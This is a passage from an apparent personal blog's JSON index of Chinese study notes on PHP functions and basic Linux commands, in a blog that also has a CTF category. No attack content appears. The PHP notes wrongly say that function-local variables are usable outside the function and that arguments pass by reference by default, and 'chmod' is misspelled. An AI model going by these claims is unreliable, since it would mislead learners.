#注意代码不完整截取一部分,应该有一个Router的类这里没写出来,只做演示。这里有两个new,但意义完全不一样,第一个new是创建了一个对象,第二个new是调用了类的构造函数,创建了一个对象并初始化了属性,容易混淆。6. 函数(感觉函数这块编程语言都比较相似大概意思差不多,但具体用起来还是有点区别) 函数：function 函数名($参数1,$参数2,$参数3){函数体} 参数：可以有0个或多个参数，参数可以有默认值。 返回值：函数可以有返回值，返回值可以是任何类型。 全局变量：函数内声明的变量，默认是局部变量，可以在函数外使用。 引用传递：函数传递的参数是引用传递，可以修改函数外的变量的值。 匿名函数：可以把函数作为参数传递给其他函数，也可以作为函数的返回值。","categories":[{"name":"PHP","slug":"PHP","permalink":"http://asd1238525.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://asd1238525.github.io/tags/PHP/"}]},{"title":"Linux指令","slug":"Linux指令","date":"2024-12-02T10:06:31.000Z","updated":"2024-12-06T14:50:06.000Z","comments":true,"path":"2024/12/02/Linux指令/","permalink":"http://asd1238525.github.io/2024/12/02/Linux%E6%8C%87%E4%BB%A4/","excerpt":"","text":"windows有盘符，linux没有，都是以目录树的形式存储文件。用户分为:普通用户,管理员用户,超级用户。普通用户:只能使用自己的目录,不能使用管理员权限的命令。管理员用户:可以管理系统中的所有文件,可以执行所有命令。超级用户:拥有最高权限,可以执行任何命令。常用命令：sudo：以超级用户权限运行命令su：切换用户whoami：显示当前用户~：表示当前用户的主目录(家目录)pwd：显示当前工作目录cd：切换目录cd ..：返回上级目录cd &#x2F;：切换到根目录ls：显示目录内容-l 显示详细信息 -a 显示隐藏文件 -d 仅显示目录 -h 以易读方式显示文件大小 -R 递归显示目录下所有文件 -r 逆序显示文件touch：创建文件mkdir：创建目录cat：查看文件内容rm：删除文件或目录cp：复制文件或目录mv：移动文件或目录find：查找文件或目录 例:find &#x2F; -name “文件名”grep:搜索文件内容(与|管道命令配合使用) 例:cat file.txt | grep “关键字”man：查看命令帮助vim：编辑文件 (w写入，q退出，i进入编辑模式，esc退出编辑模式)chomd：修改文件权限 例:chomd 777 file.txtfile:可以看文件简介xxd:查看二进制文件内容foremost:恢复被删除文件","categories":[{"name":"Linux","slug":"Linux","permalink":"http://asd1238525.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://asd1238525.github.io/tags/Linux/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/categories/CTF/"},{"name":"PHP","slug":"PHP","permalink":"http://asd1238525.github.io/categories/PHP/"},{"name":"Linux","slug":"Linux","permalink":"http://asd1238525.github.io/categories/Linux/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://asd1238525.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"http://asd1238525.github.io/tags/PHP/"},{"name":"Linux","slug":"Linux","permalink":"http://asd1238525.github.io/tags/Linux/"}]}